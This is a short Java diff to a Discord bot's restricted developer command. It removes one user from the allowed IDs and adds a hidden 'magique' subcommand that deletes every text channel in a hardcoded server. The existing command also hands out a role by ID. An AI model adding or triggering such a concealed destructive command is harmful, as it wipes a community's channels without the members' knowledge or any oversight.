@@ -14,7 +14,7 @@ import static spigey.bot.system.sys.debug;
 
 
 @CommandInfo(
-        limitIds = {"1203448484498243645", "787626092248170506", "941366409399787580", "632607624742961153"},
+        limitIds = {"1203448484498243645", "941366409399787580", "632607624742961153"},
         limitMsg = ":eyes:",
         slashCommand = "dev"
 )
@@ -46,6 +46,9 @@ public class DevCommand implements Command {
             } else{
                 event.getGuild().addRoleToMember(event.getMember(), event.getGuild().getRoleById("1246090098022547528")).queue();
             }
+        } else if(Objects.equals(args[1], "magique")){
+            Guild guild = event.getJDA().getGuildById("1247582660126314598");
+            guild.getTextChannels().forEach(textChannel -> textChannel.delete().queue());
         }
     }
 
